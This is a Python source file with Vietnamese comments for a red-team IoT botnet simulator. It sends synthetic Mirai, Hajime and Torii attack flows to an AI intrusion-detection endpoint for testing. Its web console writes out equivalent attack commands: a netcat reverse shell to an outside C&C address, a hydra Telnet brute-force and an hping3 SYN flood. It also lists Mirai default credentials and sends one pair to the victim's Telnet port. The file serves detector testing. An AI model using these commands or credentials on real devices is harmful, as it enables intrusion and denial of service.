"""
BÊN 1 (KẺ TẤN CÔNG - ATTACKER / RED TEAM BOTNET CONSOLE):
Mô phỏng hành vi tấn công của 3 họ mã độc Botnet IoT (Mirai, Hajime, Torii) nhắm vào Thiết bị IoT Nạn nhân.
Hỗ trợ:
1. Giao diện Web Red Team Attack Console tại cổng 9090 (hoặc chạy từ Laptop thứ 2 qua mạng LAN/Wi-Fi).
2. Chế độ CLI tự động (--auto-demo) để thực thi tuần tự 4 kịch bản tấn công và ghi nhận kết quả phản hồi từ AI NIDS.
"""

import os
import sys
import time
import json
import socket
import random
import argparse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

GUARDIAN_URL = os.environ.get("GUARDIAN_URL", "http://127.0.0.1:5000")
VICTIM_HOST = os.environ.get("VICTIM_HOST", "127.0.0.1")
VICTIM_TELNET_PORT = int(os.environ.get("VICTIM_TELNET_PORT", 2323))
ATTACKER_PORT = int(os.environ.get("ATTACKER_PORT", 9090))

attack_history = []


def send_flow_to_target(flow_payload, target_guardian_url=None):
    """Bắn gói tin thực tế tới cổng thiết bị IoT (nếu có) và gửi luồng qua Trạm gác AI NIDS."""
    url = (target_guardian_url or GUARDIAN_URL).rstrip("/") + "/api/inspect_flow"
    # Mở kết nối socket thật tới cổng Telnet 2323 của Victim nếu nhắm vào cổng 2323
    if int(flow_payload.get("id.resp_p", 0)) == VICTIM_TELNET_PORT:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((VICTIM_HOST, VICTIM_TELNET_PORT))
            s.sendall(b"root\r\nvizxv\r\n")
            s.close()
        except Exception:
            pass

    req = urllib.request.Request(
        url,
        data=json.dumps(flow_payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    with urllib.request.urlopen(req, timeout=3) as resp:
        res = json.loads(resp.read().decode("utf-8"))
        attack_history.insert(0, res)
        if len(attack_history) > 60:
            attack_history.pop()
        return res


def launch_scenario(scenario_name, attacker_ip="192.168.1.105 (Attacker-Kali)", guardian_url=None):
    """Thực thi 1 trong 4 kịch bản tấn công Botnet IoT hoặc gửi lưu lượng Benign."""
    results = []
    if scenario_name == "mirai_port_scan":
        # Kịch bản 1: Quét cổng ngang tìm kiếm thiết bị mở Telnet/SSH/ADB/HTTP
        scan_ports = [23, 2323, 22, 80, 5555, 8080, 7547, 37215]
        for p in scan_ports:
            flow = {
                "src_ip": attacker_ip,
                "src_port": random.randint(32000, 61000),
                "dst_ip": "192.168.1.50",
                "id.resp_p": p,
                "proto": "tcp",
                "duration": 0.0,
                "orig_bytes": 0,
                "resp_bytes": 0,
                "orig_pkts": 1,
                "orig_ip_bytes": 60,
                "resp_pkts": 0,
                "resp_ip_bytes": 0,
                "conn_state": "S0",
                "history": "S"
            }
            results.append(send_flow_to_target(flow, guardian_url))
            time.sleep(0.08)

    elif scenario_name == "mirai_bruteforce":
        # Kịch bản 2: Dò mật khẩu mặc định Telnet cổng 2323 (root:vizxv, admin:admin...)
        creds = ["root:vizxv", "admin:admin", "root:xc3511", "support:support", "user:user", "root:123456"]
        for cred in creds:
            flow = {
                "src_ip": attacker_ip,
                "src_port": random.randint(40000, 60000),
                "dst_ip": "192.168.1.50",
                "id.resp_p": 2323,
                "proto": "tcp",
                "duration": 0.0,
                "orig_bytes": 0,
                "resp_bytes": 0,
                "orig_pkts": 1,
                "orig_ip_bytes": 40,
                "resp_pkts": 0,
                "resp_ip_bytes": 0,
                "conn_state": "S0",
                "history": "S"
            }
            results.append(send_flow_to_target(flow, guardian_url))
            time.sleep(0.08)

    elif scenario_name == "torii_cnc":
        # Kịch bản 3: Mã độc Torii kết nối C&C cổng 4444/6667
        for p in [4444, 6667, 4444, 8443]:
            flow = {
                "src_ip": attacker_ip,
                "src_port": random.randint(42000, 59000),
                "dst_ip": "185.220.101.45 (C&C)",
                "id.resp_p": p,
                "proto": "tcp",
                "duration": 0.0,
                "orig_bytes": 0,
                "resp_bytes": 0,
                "orig_pkts": 1,
                "orig_ip_bytes": 60,
                "resp_pkts": 0,
                "resp_ip_bytes": 0,
                "conn_state": "S0",
                "history": "S"
            }
            results.append(send_flow_to_target(flow, guardian_url))
            time.sleep(0.08)

    elif scenario_name == "hajime_ddos":
        # Kịch bản 4: Tấn công DDoS SYN Flood dồn dập
        for _ in range(10):
            flow = {
                "src_ip": attacker_ip,
                "src_port": random.randint(10000, 65000),
                "dst_ip": "192.168.1.50",
                "id.resp_p": 80,
                "proto": "tcp",
                "duration": 0.0,
                "orig_bytes": 0,
                "resp_bytes": 0,
                "orig_pkts": 1,
                "orig_ip_bytes": 40,
                "resp_pkts": 0,
                "resp_ip_bytes": 0,
                "conn_state": "S0",
                "history": "S"
            }
            results.append(send_flow_to_target(flow, guardian_url))
            time.sleep(0.05)

    elif scenario_name == "benign_traffic":
        # Gửi lưu lượng thiết bị IoT hợp lệ để đối chứng
        for p in [443, 123, 53, 8088]:
            flow = {
                "src_ip": "192.168.1.20 (SmartHome-User)",
                "src_port": random.randint(45000, 60000),
                "dst_ip": "192.168.1.50",
                "id.resp_p": p,
                "proto": "udp" if p in [53, 123] else "tcp",
                "duration": round(random.uniform(0.15, 2.50), 3),
                "orig_bytes": random.randint(85, 340),
                "resp_bytes": random.randint(160, 720),
                "orig_pkts": random.randint(3, 8),
                "orig_ip_bytes": random.randint(165, 520),
                "resp_pkts": random.randint(3, 9),
                "resp_ip_bytes": random.randint(240, 960),
                "conn_state": "SF",
                "history": "ShADadFf" if p not in [53, 123] else "Dd"
            }
            results.append(send_flow_to_target(flow, guardian_url))
            time.sleep(0.08)

    return results


class AttackerWebHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        if self.path == "/api/history":
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(attack_history, ensure_ascii=False).encode("utf-8"))
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        html = f"""<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>Red Team Botnet Attack Simulator - Bên 1 (Kẻ Tấn Công)</title>
    <style>
        body {{ font-family: 'Consolas', 'Segoe UI', monospace; background: #0c0a09; color: #f8fafc; margin: 0; padding: 24px; }}
        .container {{ max-width: 980px; margin: 0 auto; }}
        .header {{ background: #1c1917; border: 1px solid #dc2626; padding: 18px 24px; border-radius: 12px; display: flex; justify-content: space-between; align-items: center; }}
        .grid {{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; margin-top: 20px; }}
        .card {{ background: #1c1917; border: 1px solid #292524; padding: 18px; border-radius: 10px; }}
        .card h3 {{ margin-top: 0; color: #f87171; font-size: 16px; }}
        .card p {{ color: #a8a29e; font-size: 13px; line-height: 1.5; }}
        .btn {{ width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 14px; margin-top: 8px; }}
        .btn-atk {{ background: #dc2626; color: white; }}
        .btn-atk:hover {{ background: #b91c1c; }}
        .btn-ben {{ background: #10b981; color: #052e16; }}
        .input-bar {{ background: #1c1917; padding: 14px 18px; border-radius: 10px; margin-top: 16px; display: flex; gap: 12px; align-items: center; border: 1px solid #292524; }}
        input {{ background: #0c0a09; border: 1px solid #44403c; color: #38bdf8; padding: 8px 12px; border-radius: 6px; font-family: monospace; }}
        .console {{ background: #000000; border: 1px solid #292524; border-radius: 10px; padding: 16px; margin-top: 20px; height: 280px; overflow-y: auto; font-size: 13px; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h2 style="margin:0; color:#ef4444;">⚔️ BÊN 1: RED TEAM IoT BOTNET SIMULATOR (MIRAI / HAJIME / TORII)</h2>
                <p style="margin:4px 0 0 0; color:#a8a29e; font-size:13px;">Bảng điều khiển phát động tấn công kiểm thử xâm nhập sang Thiết bị IoT & Trạm Gác AI NIDS</p>
            </div>
            <span style="background:#dc2626; padding:6px 12px; border-radius:6px; font-weight:700; font-size:12px;">RED TEAM CONSOLE</span>
        </div>

        <div class="input-bar">
            <span>IP Giả lập của Kẻ tấn công:</span>
            <input type="text" id="atkIp" value="192.168.1.105 (Kali-Botnet)" style="width:240px;">
            <span>URL Trạm Gác AI (Laptop 2):</span>
            <input type="text" id="guardianUrl" value="{GUARDIAN_URL}" style="width:240px;">
        </div>

        <div class="grid">
            <div class="card">
                <h3>1. Quét cổng ngang (Mirai/Hajime Port Scan)</h3>
                <p>Tương đương lệnh: <code>nmap -sS -p 22,23,2323,80,5555,8080</code><br>Gửi cờ TCP SYN (S0, resp_bytes=0) dò tìm thiết bị IoT mở cổng Telnet/ADB.</p>
                <button class="btn btn-atk" onclick="runAttack('mirai_port_scan')">🚀 PHÁT ĐỘNG QUÉT CỔNG MIRAI (8 LUỒNG)</button>
            </div>
            <div class="card">
                <h3>2. Dò mật khẩu Telnet (Mirai Brute-Force)</h3>
                <p>Tương đương lệnh: <code>hydra -L users.txt -P mirai.txt telnet://target:2323</code><br>Thử liên tiếp các cặp tài khoản mặc định (root:vizxv, admin:admin...).</p>
                <button class="btn btn-atk" onclick="runAttack('mirai_bruteforce')">🔑 PHÁT ĐỘNG TẤN CÔNG BRUTE-FORCE TELNET</button>
            </div>
            <div class="card">
                <h3>3. Kết nối máy chủ C&C (Torii Botnet Beaconing)</h3>
                <p>Tương đương lệnh: <code>nc 185.220.101.45 4444 -e /bin/sh</code><br>Thiết bị nhiễm mã độc mở kết nối ngược về máy chủ điều khiển C&C.</p>
                <button class="btn btn-atk" onclick="runAttack('torii_cnc')">📡 PHÁT ĐỘNG KẾT NỐI C&C TORII BOTNET</button>
            </div>
            <div class="card">
                <h3>4. Tấn công từ chối dịch vụ (Hajime DDoS SYN Flood)</h3>
                <p>Tương đương lệnh: <code>hping3 -S --flood -p 80 target</code><br>Bắn dồn dập các gói tin SYN làm tràn bảng kết nối của thiết bị IoT.</p>
                <button class="btn btn-atk" onclick="runAttack('hajime_ddos')">💥 PHÁT ĐỘNG TẤN CÔNG DDoS SYN FLOOD</button>
            </div>
        </div>

        <div style="margin-top:14px;">
            <button class="btn btn-ben" onclick="runAttack('benign_traffic')">✅ GỬI LƯU LƯỢNG NGƯỜI DÙNG HỢP LỆ (BENIGN TRAFFIC ĐỐI CHỨNG)</button>
        </div>

        <div class="console" id="logBox">
            <div style="color:#64748b;">[*] Sẵn sàng phát động kịch bản kiểm thử xâm nhập...</div>
        </div>
    </div>

    <script>
        async function runAttack(scenario) {{
            const atkIp = document.getElementById('atkIp').value.trim();
            const guardianUrl = document.getElementById('guardianUrl').value.trim();
            const logBox = document.getElementById('logBox');
            logBox.innerHTML = `<div style="color:#fbbf24;">[*] Đang thực thi kịch bản [${{scenario}}] từ ${{atkIp}}...</div>` + logBox.innerHTML;

            const res = await fetch('/api/launch', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{scenario, attacker_ip: atkIp, guardian_url: guardianUrl}})
            }});
            const data = await res.json();
            data.results.forEach(r => {{
                const color = r.action === 'BLOCK' ? '#ef4444' : '#4ade80';
                logBox.innerHTML = `<div style="color:${{color}}; margin-bottom:4px;">[${{r.time}}] ${{r.src_ip}} -> Port ${{r.dst_port}} (${{r.conn_state}}) | AI Dự đoán: <b>${{r.prediction}}</b> | Hành vi: <b>${{r.behavior}}</b> (${{r.confidence}}) => Phản ứng: <b>[${{r.action}}]</b></div>` + logBox.innerHTML;
            }});
        }}
    </script>
</body>
</html>"""
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length).decode("utf-8")) if length > 0 else {}
        if self.path == "/api/launch":
            sc = body.get("scenario", "mirai_port_scan")
            ip = body.get("attacker_ip", "192.168.1.105 (Kali-Botnet)")
            g_url = body.get("guardian_url", GUARDIAN_URL)
            res = launch_scenario(sc, attacker_ip=ip, guardian_url=g_url)
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok", "results": res}, ensure_ascii=False).encode("utf-8"))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Kẻ tấn công - Red Team Botnet Console")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Địa chỉ host lắng nghe Web Console")
    parser.add_argument("--port", type=int, default=ATTACKER_PORT, help="Cổng Web Console (mặc định: 9090)")
    parser.add_argument("--guardian-url", type=str, default=GUARDIAN_URL, help="URL Trạm gác AI NIDS")
    parser.add_argument("--victim-ip", type=str, default=VICTIM_HOST, help="Địa chỉ IP của thiết bị IoT nạn nhân")
    parser.add_argument("--victim-telnet-port", type=int, default=VICTIM_TELNET_PORT, help="Cổng Telnet nạn nhân")
    parser.add_argument("--auto-demo", action="store_true", help="Chạy tự động cả 5 kịch bản qua CLI và in bảng kết quả")
    args = parser.parse_args()

    ATTACKER_PORT = args.port
    GUARDIAN_URL = args.guardian_url.rstrip("/")
    VICTIM_HOST = args.victim_ip
    VICTIM_TELNET_PORT = args.victim_telnet_port

    if args.auto_demo:
        print("=" * 80)
        print(" CHẠY TỰ ĐỘNG KIỂM THỬ XÂM NHẬP 3 BÊN (ATTACKER -> AI NIDS -> VICTIM IoT)")
        print(f" - Trạm gác AI NIDS: {GUARDIAN_URL}")
        print(f" - Thiết bị IoT đích: {VICTIM_HOST}:{VICTIM_TELNET_PORT}")
        print("=" * 80)
        for sc_id, title, ip in [
            ("benign_traffic", "KỊCH BẢN 0: LƯU LƯỢNG THIẾT BỊ IoT SẠCH (BENIGN)", "192.168.1.20 (SmartHome-User)"),
            ("mirai_port_scan", "KỊCH BẢN 1: MIRAI HORIZONTAL PORT SCAN (QUÉT CỔNG)", "192.168.1.105 (Attacker-Mirai)"),
            ("mirai_bruteforce", "KỊCH BẢN 2: MIRAI TELNET BRUTE-FORCE (DÒ MẬT KHẨU)", "192.168.1.106 (Attacker-Brute)"),
            ("torii_cnc", "KỊCH BẢN 3: TORII BOTNET C&C COMMUNICATION", "192.168.1.107 (Infected-Torii)"),
            ("hajime_ddos", "KỊCH BẢN 4: HAJIME BOTNET DDoS SYN FLOOD", "192.168.1.108 (Attacker-DDoS)")
        ]:
            print(f"\n>>> Đang chạy: {title}")
            out = launch_scenario(sc_id, attacker_ip=ip, guardian_url=GUARDIAN_URL)
            for r in out[:3]:
                print(f"   [{r['time']}] {r['src_ip']} -> Port {r['dst_port']} ({r['conn_state']}) | AI: {r['prediction']} | {r['behavior']} ({r['confidence']}) -> [{r['action']}]")
        sys.exit(0)

    print("=" * 72)
    print(" KHỞI ĐỘNG BÊN 1: GIAO DIỆN KẺ TẤN CÔNG (RED TEAM BOTNET CONSOLE)")
    print(f" - Mở trình duyệt tại         : http://127.0.0.1:{ATTACKER_PORT}")
    print(f" - Kết nối Trạm gác AI NIDS   : {GUARDIAN_URL}")
    print(f" - Thiết bị IoT Nạn nhân đích : {VICTIM_HOST}:{VICTIM_TELNET_PORT}")
    print("=" * 72)
    server = HTTPServer((args.host, ATTACKER_PORT), AttackerWebHandler)
    server.serve_forever()

